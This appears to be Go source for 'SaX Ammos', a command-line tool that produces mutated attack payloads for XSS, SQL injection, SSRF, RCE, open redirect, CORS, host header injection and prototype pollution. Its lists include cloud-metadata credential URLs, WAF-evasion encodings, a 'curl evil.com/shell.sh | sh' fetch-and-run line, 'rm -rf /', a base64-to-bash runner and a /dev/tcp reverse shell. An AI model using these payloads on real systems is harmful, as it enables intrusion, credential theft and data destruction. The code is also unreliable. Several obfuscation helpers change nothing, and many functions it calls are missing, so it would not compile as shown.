package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time" // Re-introducing time for simple banner animation
	"unicode/utf16"
)

// BugType represents the type of vulnerability.
type BugType string

const (
	XSS                 BugType = "XSS"
	SQLi                BugType = "SQLi"
	SSRF                BugType = "SSRF"
	CORS                BugType = "CORS"
	OpenRedirect        BugType = "Open Redirect"
	RCE                 BugType = "RCE"
	HostHeaderInjection BugType = "Host Header Injection"
	PrototypePollution  BugType = "Prototype Pollution"
)

// IntensityLevel represents the desired payload complexity.
type IntensityLevel string

const (
	Low      IntensityLevel = "low"
	Medium   IntensityLevel = "medium"
	Hard     IntensityLevel = "hard"
	GodLevel IntensityLevel = "godlevel"
)

// Payload represents a generated payload variant.
type Payload struct {
	Type    BugType
	Level   IntensityLevel
	Raw     string   // Original base payload
	Mutated []string // All generated variants
}

// Global state for unique payload tracking
var uniquePayloads map[string]struct{}

func init() {
	uniquePayloads = make(map[string]struct{})
}

func main() {
	renderBanner() // Render the aesthetic banner

	bugTypeStr := ""
	intensityLevelStr := ""
	outputFile := ""

	// Parse command-line arguments
	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-bug":
			if i+1 < len(args) {
				bugTypeStr = args[i+1]
				i++
			}
		case "-level":
			if i+1 < len(args) {
				intensityLevelStr = args[i+1]
				i++
			}
		case "-output":
			if i+1 < len(args) {
				outputFile = args[i+1]
				i++
			}
		}
	}

	// If arguments not provided, prompt user with clean aesthetic
	if bugTypeStr == "" {
		fmt.Print(" [>] Bug Type (XSS, SQLi, SSRF, CORS, RCE, Open Redirect, Host Header Injection, Prototype Pollution): ")
		bugTypeStr = readInput()
	}

	if intensityLevelStr == "" {
		fmt.Print(" [>] Intensity Level (low, medium, hard, godlevel): ")
		intensityLevelStr = readInput()
	}

	bugType := mapBugType(bugTypeStr)
	level := mapIntensityLevel(intensityLevelStr)

	if bugType == "" || level == "" {
		fmt.Println(" [!] ERROR: Invalid bug type or intensity level provided. Aborting operation.")
		os.Exit(1)
	}

	// Dynamic section border for generation
	fmt.Printf("\n [+] MODULE: %s | LEVEL: %s\n", strings.ToUpper(string(bugType)), strings.ToUpper(string(level)))
	fmt.Println(" ----------------------------------------------------")
	fmt.Printf(" > Generating 100+ payloads for %s at %s intensity...\n", string(bugType), string(level))
	fmt.Println(" ----------------------------------------------------")

	generatedAmmos := generatePayloads(bugType, level)

	// Section border for sample payloads
	fmt.Println("\n [+] PAYLOAD SAMPLES (10):")
	fmt.Println(" ----------------------------------------------------")
	sampleCount := 0
	for _, ammo := range generatedAmmos {
		for _, p := range ammo.Mutated {
			if sampleCount < 10 {
				fmt.Printf("   %s\n", p) // Indent samples for readability
				sampleCount++
			} else {
				break
			}
		}
		if sampleCount >= 10 {
			break
		}
	}
	fmt.Println(" ----------------------------------------------------")

	saveToFile := "n"
	if outputFile == "" {
		fmt.Print("\n [+] Save full payload list to file? (y/n): ")
		saveToFile = readInput()
	} else {
		saveToFile = "y" // Auto-save if output file is specified
	}

	if strings.ToLower(saveToFile) == "y" {
		if outputFile == "" {
			outputFile = fmt.Sprintf("payloads/%s_%s.txt", strings.ToLower(string(bugType)), strings.ToLower(string(level)))
		}

		dir := filepath.Dir(outputFile)
		if dir != "" {
			err := os.MkdirAll(dir, 0755)
			if err != nil {
				fmt.Printf(" [!] ERROR: Failed to create directory %s: %v. Aborting save.\n", dir, err)
				os.Exit(1)
			}
		}

		err := writePayloadsToFile(generatedAmmos, outputFile)
		if err != nil {
			fmt.Printf(" [!] ERROR: Failed to save payloads to file %s: %v\n", outputFile, err)
		} else {
			fmt.Printf(" [+] Full payload list saved to: %s\n", outputFile)
		}
	}
	fmt.Println("\n [•] Operation Complete.")
}

// renderBanner displays the dynamic ASCII banner for SaX Ammos.
func renderBanner() {
	banner := `
███████╗ █████╗ ███╗   ██╗██╗  ██╗     █████╗ ███╗   ███╗███╗   ███╗ ██████╗ ███████╗
██╔════╝██╔══██╗████╗  ██║╚██╗██╔╝    ██╔══██╗████╗ ████║████╗ ████║██╔═══██╗██╔════╝
███████╗███████║██╔██╗ ██║ ╚███╔╝     ███████║██╔████╔██║██╔████╔██║██║   ██║███████╗
╚════██║██╔══██║██║╚██╗██║ ██╔██╗     ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██║   ██║╚════██║
███████║██║  ██║██║ ╚████║██╔╝ ██╗    ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
`
	fmt.Println(banner)
	fmt.Println(" ----------------------------------------------------")
	fmt.Println("    SaX Ammos: Offensive Payload Engineering Framework")
	fmt.Println(" ----------------------------------------------------")
	fmt.Printf("   Current System Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05 MST"))
	fmt.Println(" ----------------------------------------------------\n")
}

// readInput reads a line from stdin.
func readInput() string {
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// mapBugType converts a string to BugType.
func mapBugType(s string) BugType {
	switch strings.ToLower(s) {
	case "xss":
		return XSS
	case "sqli":
		return SQLi
	case "ssrf":
		return SSRF
	case "cors":
		return CORS
	case "open redirect", "openredirect":
		return OpenRedirect
	case "rce":
		return RCE
	case "host header injection", "hostheaderinjection":
		return HostHeaderInjection
	case "prototype pollution", "prototypepollution":
		return PrototypePollution
	default:
		return ""
	}
}

// mapIntensityLevel converts a string to IntensityLevel.
func mapIntensityLevel(s string) IntensityLevel {
	switch strings.ToLower(s) {
	case "low":
		return Low
	case "medium":
		return Medium
	case "hard":
		return Hard
	case "godlevel":
		return GodLevel
	default:
		return ""
	}
}

// generatePayloads is the main payload generation orchestrator.
func generatePayloads(bugType BugType, level IntensityLevel) []Payload {
	var results []Payload
	basePayloads := getBasePayloads(bugType, level)

	// Clear uniquePayloads map for each generation run
	uniquePayloads = make(map[string]struct{})

	for _, base := range basePayloads {
		mutatedList := permutePayloads(base, bugType, level)
		results = append(results, Payload{
			Type:    bugType,
			Level:   level,
			Raw:     base,
			Mutated: mutatedList,
		})
	}

	return results
}

// getBasePayloads provides a diverse set of starting points.
func getBasePayloads(bugType BugType, level IntensityLevel) []string {
	// These are base payloads, mutation logic expands them significantly.
	// For 'godlevel', more complex or less common bases might be added.
	switch bugType {
	case XSS:
		return []string{
			`<script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`javascript:alert(1)`,
			`<body onpointerdown=alert(1)>`,
			`<iframe srcdoc='<script>alert(1)</script>'>`,
			`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`, // Base64 HTML
			`<details open ontoggle=alert(1)>`,                                                // HTML5 event
			`" onmouseover="alert(1)"`,                                                        // Common attribute injection
			`<img src onerror=eval(atob('YWxlcnQoMSk='))>`,
		}
	case SQLi:
		return []string{
			`' OR '1'='1'--`,
			`" OR "1"="1"--`,
			`1 UNION SELECT null,null,null,null--`, // Use common column counts
			`1 AND SLEEP(5)--`,
			`1' AND (SELECT 55 FROM PG_SLEEP(5))--`, // PostgreSQL
			`1 AND 1=BENCHMARK(5000000,MD5(1))--`,    // MySQL time-based
			`1' AND (SELECT 0 FROM (SELECT COUNT(*),GROUP_CONCAT(0x7c,0x27,user(),0x27,0x7c) FROM information_schema.tables a GROUP BY 0x7e)x)--`, // MySQL Error-based
			`1' UNION SELECT @@version,null,null,null#`,
			`1' OR 1=1 #`,
			`' OR 1=1 /*`,
			`') OR ('1'='1`,
			`%27%20OR%20%271%27%3D%271%27--`, // URL encoded
			`ORDER BY 10--`,                 // Blind SQLi via order by
		}
	case SSRF:
		return []string{
			`127.0.0.1`,
			`localhost`,
			`0.0.0.0`,
			`0x7f000001`,                    // Hex IP
			`2130706433`,                    // Decimal IP
			`0177.0000.0000.0001`,           // Octal IP
			`http://169.254.169.254/latest/meta-data/`, // AWS Metadata
			`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
			`http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip`, // GCP Metadata
			`http://[::]:80/`,               // IPv6 loopback
			`http://[0:0:0:0:0:0:0:1]:80/`,   // Full IPv6 loopback
			`http://127.1/`,                 // Shortened IP
			`file:///etc/passwd`,            // File protocol
			`dict://localhost:6379/info`,    // Redis
			`gopher://localhost:80/`,        // Gopher for advanced SSRF
			`http://localtest.me/`,          // DNS rebinding helper
		}
	case CORS:
		return []string{
			`null`,
			`https://evil.com`,
			`https://victim.com.evil.com`,
			`http://localhost`,
			`https://sub.victim.com`, // For wildcard testing
		}
	case OpenRedirect:
		return []string{
			`//evil.com`,
			`https://evil.com`,
			`javascript:alert(1)`, // Some implementations might treat this as redirect
			`data:text/html,<script>alert(1)</script>`,
			`http://%65vil.com`, // Hex encoding
			`https://www.google.com/url?q=https://evil.com`, // Nested redirect
			`https://target.com/\evil.com`,                  // Backslash
			`https://target.com/..\evil.com`,                // Path traversal
			`https://target.com///evil.com`,                 // Multiple slashes
			`http://target.com/@evil.com`,                   // @ bypass
			`http://target.com/?url=evil.com`,               // Query param bypass
		}
	case RCE:
		return []string{
			`$(id)`,            // Linux command injection
			`%24%28id%29`,      // URL encoded
			`exec('id')`,       // PHP/Python eval
			`system('id')`,     // PHP/Perl
			`" | id || "`,      // Pipe injection
			`%0aid%0a`,         // Newline injection
			`cmd /c dir`,       // Windows command injection
			`calc.exe`,         // Windows specific
			`cat /etc/passwd`,
			`curl evil.com/shell.sh | sh`, // Remote script execution
			`rm -rf /`,
		}
	case HostHeaderInjection:
		return []string{
			`evil.com`,
			`evil.com:8080`,
			`evil.com#@victim.com`, // For password-based auth parsing issues
			`evil.com%20`,          // Trailing space
			`evil.com\x0d\x0aX-Forwarded-Host: evil.com`, // CRLF injection
			`evil.com.victim.com`,
			`127.0.0.1`,
			`localhost`,
		}
	case PrototypePollution:
		return []string{
			`{"__proto__":{"polluted":true}}`,
			`{"constructor":{"prototype":{"polluted":true}}}`,
			`?__proto__[polluted]=true`,
			`?constructor.prototype.polluted=true`,
			`{"a":"b"}&__proto__={"polluted":true}`,
			`__proto__.polluted=true`, // Query string, non-JSON
			`constructor.prototype.polluted=true`,
		}
	default:
		return []string{}
	}
}

// permutePayloads generates variants based on bug type and intensity level.
func permutePayloads(base string, bugType BugType, level IntensityLevel) []string {
	mutated := []string{}
	payloadQueue := []string{base} // BFS-like approach for permutations

	// Add base to unique set
	addUniquePayload(base, &mutated)

	iterationLimit := 200 // Cap permutations to avoid endless loops for 'godlevel'
	currentIteration := 0

	for len(payloadQueue) > 0 && len(mutated) < 1500 && currentIteration < iterationLimit {
		currentPayload := payloadQueue[0]
		payloadQueue = payloadQueue[1:]

		// Apply core mutations based on level
		newVariants := mutatePayload(currentPayload, bugType, level)
		for _, v := range newVariants {
			if addUniquePayload(v, &mutated) {
				payloadQueue = append(payloadQueue, v) // Add new, unique variants back to queue
			}
		}

		currentIteration++
	}

	// Ensure we hit at least 100 unique payloads by generating more
	// if necessary, especially for lower intensity levels.
	targetCount := 100
	if level == Medium {
		targetCount = 250
	} else if level == Hard {
		targetCount = 500
	} else if level == GodLevel {
		targetCount = 1000 // GodLevel seeks max diversity
	}

	// Continue mutating existing payloads until targetCount is met
	// or no new unique payloads can be generated from the current set.
	addedAnyInIteration := true
	for len(mutated) < targetCount && addedAnyInIteration {
		addedAnyInIteration = false
		originalMutatedCount := len(mutated)

		// Iterate over a copy of mutated to avoid issues with modification during iteration
		currentMutatedCopy := make([]string, len(mutated))
		copy(currentMutatedCopy, mutated)

		for _, existingPayload := range currentMutatedCopy {
			newVariants := mutatePayload(existingPayload, bugType, level)
			for _, v := range newVariants {
				if addUniquePayload(v, &mutated) {
					addedAnyInIteration = true
				}
			}
			if len(mutated) >= targetCount {
				break
			}
		}
		if len(mutated) == originalMutatedCount && !addedAnyInIteration {
			// If no new payloads were added from any existing payload, break to prevent infinite loop.
			break
		}
	}

	return mutated
}

// mutatePayload applies various permutation techniques based on bug type and intensity.
func mutatePayload(payload string, bugType BugType, level IntensityLevel) []string {
	var variants []string

	// Always include the current payload as a base for further mutations if it's new
	variants = append(variants, payload)

	// Basic encodings
	variants = append(variants, mixCase(payload))
	variants = append(variants, url.QueryEscape(payload))
	variants = append(variants, url.QueryEscape(url.QueryEscape(payload))) // Double URL encode

	if level == Medium || level == Hard || level == GodLevel {
		variants = append(variants, encodeHTML(payload))
		variants = append(variants, encodeUnicode(payload))
	}

	// Type-specific mutations
	switch bugType {
	case XSS:
		variants = append(variants, obfuscateJS(payload))
		variants = append(variants, base64EncodeXSS(payload))
		variants = append(variants, jsCharCodeEncode(payload))
		if level == Hard || level == GodLevel {
			variants = append(variants, jsSchemeEncode(payload))
			variants = append(variants, `<iframe src='data:text/html;base64,`+base64.StdEncoding.EncodeToString([]byte(payload))+`'></iframe>`)
			variants = append(variants, `data:text/html;base64,`+base64.StdEncoding.EncodeToString([]byte(payload))) // Blob/Data URI
			// Append all CSP bypass payloads
			for _, cspP := range cspBypassPayloads(payload) {
				variants = append(variants, cspP)
			}
		}
		// Nested encoding for XSS
		for _, v := range variants {
			variants = append(variants, encodeHTML(url.QueryEscape(v)))
			variants = append(variants, url.QueryEscape(encodeHTML(v)))
		}

	case SQLi:
		variants = append(variants, sqlCommentInjection(payload))
		variants = append(variants, sqlHexUnicodeInjection(payload))
		if level == Medium || level == Hard || level == GodLevel {
			variants = append(variants, sqlTimeErrorBased(payload))
			variants = append(variants, `' UNION SELECT `+generateSQLColumns(5)+`--`)
			variants = append(variants, `' OR '1'='1'/*`)   // Different comment style
			variants = append(variants, `' OR '1'='1'-- -`) // Trailing dash
			variants = append(variants, `'' OR 1=1 OR ''='`) // Obfuscated quotes
		}
		if level == Hard || level == GodLevel {
			variants = append(variants, sqlObfuscateKeywords(payload))
		}

	case SSRF:
		variants = append(variants, ipToDecimal(payload))
		variants = append(variants, ipToHex(payload))
		variants = append(variants, ipToOctal(payload))
		// Append all header-based SSRF payloads
		for _, h := range headerBasedSSRF(payload) {
			variants = append(variants, h)
		}
		if level == Hard || level == GodLevel {
			variants = append(variants, dnsRebindingPayload(payload))
			variants = append(variants, `http://`+url.QueryEscape(`127.0.0.1`)+`/`) // Double encoded for URL path
			variants = append(variants, `http://localhost%0a/admin`)             // Newline injection
			variants = append(variants, `http://localhost#@evil.com`)           // @ bypass
			variants = append(variants, `http://localhost/..%2f/..%2fetc/passwd`) // Path traversal
		}

	case CORS:
		variants = append(variants, `Origin: `+payload) // Ensure it's a full origin header
		variants = append(variants, `Origin: `+wildcardSubdomain(payload))
		if level == Medium || level == Hard || level == GodLevel {
			variants = append(variants, `Origin: `+mixCase(payload))
			variants = append(variants, `Origin: `+strings.ReplaceAll(payload, ".", ".%00.")) // Null byte injection
		}
		if level == Hard || level == GodLevel {
			// Append all CORS preflight forcing headers
			for _, cp := range corsPreflightForce(payload) {
				variants = append(variants, cp)
			}
			variants = append(variants, `Origin: `+fmt.Sprintf("%s.evil.com", strings.TrimPrefix(strings.TrimPrefix(payload, "http://"), "https://")))
		}

	case OpenRedirect:
		variants = append(variants, base64Encode(payload))
		variants = append(variants, nestedRedirect(payload))
		variants = append(variants, mixedSchema(payload))
		variants = append(variants, protocollessRedirect(payload))
		if level == Medium || level == Hard || level == GodLevel {
			variants = append(variants, url.QueryEscape(payload)) // URL encode the full redirect
			variants = append(variants, strings.ReplaceAll(payload, "/", `\/`))
			variants = append(variants, strings.ReplaceAll(payload, ".", `%2e`))
			variants = append(variants, strings.ReplaceAll(payload, "://", `://%2f`)) // Slash encoding
		}
		if level == Hard || level == GodLevel {
			variants = append(variants, pathTraversalRedirect(payload))
			variants = append(variants, commentBreakRedirect(payload))
			variants = append(variants, doubleSlashRedirect(payload))
			variants = append(variants, `//%0a`+strings.TrimPrefix(strings.TrimPrefix(payload, "http://"), "https://")) // Newline
		}

	case RCE:
		variants = append(variants, shellCommandEncode(payload))
		variants = append(variants, newlineInjectionRCE(payload))
		if level == Medium || level == Hard || level == GodLevel {
			variants = append(variants, pipeInjectionRCE(payload))
			variants = append(variants, base64EncodeRCE(payload))
			variants = append(variants, reverseShellRCE(payload))
		}
		if level == Hard || level == GodLevel {
			variants = append(variants, cmdBypassRCE(payload))
			variants = append(variants, obfuscateCommand(payload))
		}

	case HostHeaderInjection:
		variants = append(variants, hostHeaderOverwrite(payload))
		// Append all X-Forwarded-Host combo payloads
		for _, xfh := range xForwardedHostCombo(payload) {
			variants = append(variants, xfh)
		}
		if level == Medium || level == Hard || level == GodLevel {
			variants = append(variants, portInjection(payload))
			variants = append(variants, crlfInjectionHost(payload))
			variants = append(variants, doubleHostHeader(payload))
		}
		if level == Hard || level == GodLevel {
			variants = append(variants, hostHeaderNullByte(payload))
			variants = append(variants, hostHeaderSubdomainSpoof(payload))
		}

	case PrototypePollution:
		variants = append(variants, protoPollutionJSON(payload))
		variants = append(variants, protoPollutionQuery(payload))
		if level == Medium || level == Hard || level == GodLevel {
			variants = append(variants, protoPollutionConstructor(payload))
			variants = append(variants, protoPollutionMultiLevel(payload))
		}
		if level == Hard || level == GodLevel {
			variants = append(variants, protoPollutionArray(payload))
			variants = append(variants, protoPollutionHeader(payload))
		}
	}

	return variants
}

// addUniquePayload adds a payload to the unique set and the list if not already present.
func addUniquePayload(p string, list *[]string) bool {
	if _, exists := uniquePayloads[p]; !exists {
		uniquePayloads[p] = struct{}{}
		*list = append(*list, p)
		return true
	}
	return false
}

// writePayloadsToFile writes the generated payloads to a file.
func writePayloadsToFile(payloads []Payload, filename string) error {
	var allPayloads []string
	for _, p := range payloads {
		allPayloads = append(allPayloads, p.Mutated...)
	}

	// Use a map to ensure absolute uniqueness across all Raw/Mutated sets
	finalUniqueSet := make(map[string]struct{})
	for _, p := range allPayloads {
		finalUniqueSet[p] = struct{}{}
	}

	var sortedPayloads []string
	for p := range finalUniqueSet {
		sortedPayloads = append(sortedPayloads, p)
	}

	// Optional: Sort for consistent output (not strictly required but good for review)
	// sort.Strings(sortedPayloads)

	data := strings.Join(sortedPayloads, "\n")
	return ioutil.WriteFile(filename, []byte(data), 0644)
}

// --- Encoding and Obfuscation Helper Functions ---

// encodeHTML converts a string to HTML entities.
func encodeHTML(s string) string {
	var b strings.Builder
	for _, r := range s {
		fmt.Fprintf(&b, "&#x%x;", r)
	}
	return b.String()
}

// encodeUnicode converts a string to JavaScript unicode escapes.
func encodeUnicode(s string) string {
	var b strings.Builder
	for _, r := range utf16.Encode([]rune(s)) {
		fmt.Fprintf(&b, "\\u%04x", r)
	}
	return b.String()
}

// obfuscateJS fragments common JS keywords. More advanced than the previous iteration.
func obfuscateJS(s string) string {
	s = strings.ReplaceAll(s, "alert", `al`+`ert`)
	s = strings.ReplaceAll(s, "script", `scr`+`ipt`)
	s = strings.ReplaceAll(s, "onerror", `on`+`error`)
	s = strings.ReplaceAll(s, "eval", `e`+`val`)
	s = strings.ReplaceAll(s, "document.cookie", `docu`+`ment[`+`'cookie'`+`]`)
	s = strings.ReplaceAll(s, "window.location", `win`+`dow[`+`'location'`+`]`)
	s = strings.ReplaceAll(s, "(1)", `(String.fromCharCode(49))`) // (1) -> (String.fromCharCode(49))
	s = strings.ReplaceAll(s, "alert(1)", `eval('al'+'ert(1)')`)
	return s
}

// mixCase randomly switches the case of characters.
func mixCase(s string) string {
	var b strings.Builder
	for _, r := range s {
		// Use crypto/rand for better randomness in character casing
		bigInt, err := rand.Int(rand.Reader, big.NewInt(2))
		if err != nil {
			// Fallback or log error if crypto/rand fails, though rare
			b.WriteRune(r)
			continue
		}
		if bigInt.Int64() == 0 { // 50% chance to switch case
			if 'a' <= r && r <= 'z' {
				b.WriteRune(r - 32) // Convert to uppercase
			} else if 'A' <= r && r <= 'Z' {
				b.WriteRune(r + 32) // Convert to lowercase
			} else {
				b.WriteRune(r)
			}
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// base64EncodeXSS for XSS specific base64 encoding (e.g., `eval(atob('...'))`)
func base64EncodeXSS(s string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(s))
	return fmt.Sprintf("eval(atob('%s'))", encoded)
}

// jsCharCodeEncode converts string to JS char code sequence.
func jsCharCodeEncode(s string) string {
	var codes []string
	for _, r := range s {
		codes = append(codes, fmt.Sprintf("%d", r))
	}
	return fmt.Sprintf("String.fromCharCode(%s)", strings.Join(codes, ","))
}

// jsSchemeEncode for XSS JavaScript URI scheme variants.
func jsSchemeEncode(s string) string {
	return fmt.Sprintf("javascript:%s", url.QueryEscape(s))
}

// cspBypassPayloads generates payloads targeting CSP bypasses.
func cspBypassPayloads(s string) []string {
	return []string{
		`<img src=x onerror=this.src='data:text/html;base64,` + base64.StdEncoding.EncodeToString([]byte(s)) + `'>`, // Data URI bypass
		`<object data='data:text/html;base64,` + base64.StdEncoding.EncodeToString([]byte(s)) + `'>`,                // Object data URI
		`<iframe src='javascript:void(0)' onload='this.contentWindow.location.href="` + jsSchemeEncode(s) + `";'></iframe>`, // Iframe + JS scheme
		`<svg><script>alert&#x28;1&#x29;</script></svg>`, // SVG + HTML entities
		`<a href='data:text/html;base64,` + base64.StdEncoding.EncodeToString([]byte(s)) + `'>Click Me</a>`,
	}
}

// sqlCommentInjection inserts comments to bypass WAFs.
func sqlCommentInjection(s string) string {
	if strings.Contains(s, "OR") {
		return strings.Replace(s, "OR", "/*!OR*/", 1)
	}
	if strings.Contains(s, "UNION") {
		return strings.Replace(s, "UNION", "/*!UNION*/", 1)
	}
	return s + " /*!*/"
}

// sqlHexUnicodeInjection converts parts of SQLi to hex/unicode.
func sqlHexUnicodeInjection(s string) string {
	if strings.Contains(s, "1=1") {
		return strings.Replace(s, "1=1", `0x31=0x31`, 1) // 1=1 to hex
	}
	if strings.Contains(s, "SELECT") {
		return strings.Replace(s, "SELECT", `S%45LECT`, 1) // Partial URL encode
	}
	return s
}

// sqlTimeErrorBased combines time-based with error-based.
func sqlTimeErrorBased(s string) string {
	if strings.Contains(s, "SLEEP") || strings.Contains(s, "DELAY") {
		// Example: ' OR SLEEP(5) AND (SELECT 1 FROM (SELECT COUNT(*),GROUP_CONCAT(rand()) FROM information_schema.tables)x)--
		return s + ` AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7c,(SELECT current_user()),0x7c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--`
	}
	return s + ` AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)` // Generic error-based
}

// generateSQLColumns creates a comma-separated list of nulls for UNION SELECT.
func generateSQLColumns(count int) string {
	if count <= 0 {
		return ""
	}
	columns := make([]string, count)
	for i := range columns {
		columns[i] = "null"
	}
	return strings.Join(columns, ",")
}

// sqlObfuscateKeywords attempts to break SQL keywords.
func sqlObfuscateKeywords(s string) string {
	s = strings.ReplaceAll(s, "SELECT", `SEL` + `ECT`)
	s = strings.ReplaceAll(s, "UNION", `UNI` + `ON`)
	s = strings.ReplaceAll(s, "FROM", `FR` + `OM`)
	s = strings.ReplaceAll(s, "WHERE", `WHE` + `RE`)
	s = strings.ReplaceAll(s, "OR", `O` + `R`)
	s = strings.ReplaceAll(s, "AND", `A` + `ND`)
	return s
}

// ipToDecimal converts IPv4 to decimal (e.g., 127.0.0.1 -> 2130706433).
func ipToDecimal(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return ip // Not a valid IPv4 for this conversion
	}
	var dec int64
	for i, part := range parts {
		val, err := strconv.ParseInt(part, 10, 64)
		if err != nil {
			return ip
		}
		dec += val << uint((3-i)*8)
	}
	return fmt.Sprintf("%d", dec)
}

// ipToHex converts IPv4 to hexadecimal (e.g., 127.0.0.1 -> 0x7f000001).
func ipToHex(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return ip
	}
	var hexParts []string
	for _, part := range parts {
		val, err := strconv.ParseInt(part, 10, 64)
		if err != nil {
			return ip
		}
		hexParts = append(hexParts, fmt.Sprintf("%02x", val))
	}
	return "0x" + strings.Join(hexParts, "")
}

// ipToOctal converts IPv4 to octal (e.g., 127.0.0.1 -> 0177.0000.0000.0001).
func ipToOctal(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return ip
	}
	var octalParts []string
	for _, part := range parts {
		val, err := strconv.ParseInt(part, 10, 64)
		if err != nil {
			return ip
		}
		octalParts = append(octalParts, fmt.Sprintf("0%o", val))
	}
	return strings.Join(octalParts, ".")
}

// headerBasedSSRF generates payloads using common HTTP headers.
func headerBasedSSRF(s string) []string {
	return []string{
		fmt.Sprintf("X-Forwarded-For: %s", s),
		fmt.Sprintf("X-Forwarded-Host: %s", s),
		fmt.Sprintf("X-Host: %s", s),
		fmt.Sprintf("Referer: http://%s/", s),
		fmt.Sprintf("True-Client-IP: %s", s),
	}
}

// dnsRebindingPayload creates a DNS rebinding-style payload.
func dnsRebindingPayload(s string) string {
	// Simple example: evil.com.internal-ip.rebind.me
	// Requires an actual DNS rebinding service/domain
	parsedURL, err := url.Parse(s)
	if err != nil || !parsedURL.IsAbs() { // Needs to be an absolute URL
		return fmt.Sprintf("http://%s.rebind.me/", s) // Fallback for simple strings
	}
	return fmt.Sprintf("%s.rebind.me", parsedURL.Hostname()) // Use hostname
}

// wildcardSubdomain creates an origin like `null` or `evil.victim.com`.
func wildcardSubdomain(s string) string {
	if s == "null" {
		return s
	}
	// example: https://sub.victim.com -> https://evil.sub.victim.com
	parsedURL, err := url.Parse(s)
	if err == nil && parsedURL.Host != "" {
		hostParts := strings.Split(parsedURL.Host, ".")
		if len(hostParts) > 1 {
			return parsedURL.Scheme + "://evil." + strings.Join(hostParts[len(hostParts)-2:], ".")
		}
	}
	return fmt.Sprintf("https://evil.%s", s)
}

// corsPreflightForce generates headers to force a CORS preflight request.
func corsPreflightForce(s string) []string {
	return []string{
		fmt.Sprintf("Origin: %s\nAccess-Control-Request-Method: PUT", s),
		fmt.Sprintf("Origin: %s\nAccess-Control-Request-Headers: Authorization", s),
		fmt.Sprintf("Origin: %s\nAccess-Control-Request-Method: DELETE\nAccess-Control-Request-Headers: X-Custom-Header", s),
	}
}

// base64Encode encodes a string to Base64 (general purpose).
func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

// nestedRedirect creates a nested redirect chain.
func nestedRedirect(s string) string {
	return fmt.Sprintf("https://attacker.com/redirect?url=%s", url.QueryEscape(s))
}

// mixedSchema attempts to confuse schema parsing.
func mixedSchema(s string) string {
	return `/\/` + strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://")
}

// protocollessRedirect removes the protocol for flexible redirects.
func protocollessRedirect(s string) string {
	return `//` + strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://")
}

// pathTraversalRedirect uses path traversal to bypass allow-lists.
func pathTraversalRedirect(s string) string {
	return fmt.Sprintf(`https://target.com/../..//%s`, strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://"))
}

// commentBreakRedirect uses comment-like characters to break parsing.
func commentBreakRedirect(s string) string {
	return fmt.Sprintf(`//target.com/%23%s`, strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://")) // # comment
}

// doubleSlashRedirect uses multiple slashes for bypass.
func doubleSlashRedirect(s string) string {
	return fmt.Sprintf(`////%s`, strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://"))
}

// shellCommandEncode applies various shell command encoding.
func shellCommandEncode(s string) string {
	// Simple command: id
	// Encode for bash: $'\151\144'
	// Encode for shell: `\x69\x64`
	if s == "id" {
		return `$'\151\144'` // Octal escape
	}
	return s
}

// newlineInjectionRCE injects newlines to bypass single-line filters.
func newlineInjectionRCE(s string) string {
	return fmt.Sprintf("%s\n%s", s, "id") // Example: command1\ncommand2
}

// pipeInjectionRCE uses pipe characters for command chaining.
func pipeInjectionRCE(s string) string {
	return fmt.Sprintf("%s | %s", s, "ls -la")
}

// base64EncodeRCE encodes RCE commands in base64 for eval/bash -c "echo ...|base64 -d|bash"
func base64EncodeRCE(s string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(s))
	return fmt.Sprintf("echo %s | base64 -d | bash", encoded) // Linux
}

// reverseShellRCE generates a basic reverse shell payload.
func reverseShellRCE(s string) string {
	// This is a placeholder; requires actual attacker IP/port
	return `bash -i >& /dev/tcp/YOUR_ATTACKER_IP/YOUR_ATTACKER_PORT 0>&1`
}

// cmdBypassRCE applies specific Windows command prompt bypasses.
func cmdBypassRCE(s string) string {
	if strings.Contains(s, "dir") || strings.Contains(s, "whoami") {
		return strings.ReplaceAll(s, " ", "^ ") // Space evasion
	}
	return s
}

// obfuscateCommand attempts to obfuscate commands for RCE.
func obfuscateCommand(s string) string {
	if strings.Contains(s, "cat /etc/passwd") {
		return `ca` + `t` + ` /etc/pass` + `wd` // Fragmenting
	}
	return s
}

// hostHeaderOverwrite simple host header override.
func hostHeaderOverwrite(s string) string {
	return s
}

// xForwardedHostCombo combines Host and X-Forwarded-Host.
func xForwardedHostCombo(s string) []string {
	return []string{
		fmt.Sprintf("Host: %s\nX-Forwarded-Host: %s", "legitimate.com", s),
		fmt.Sprintf("Host: %s\nX-Forwarded-Host: %s", s, s), // Double host
	}
}

// portInjection adds a non-standard port to the Host header.
func portInjection(s string) string {
	return fmt.Sprintf("%s:8080", s)
}

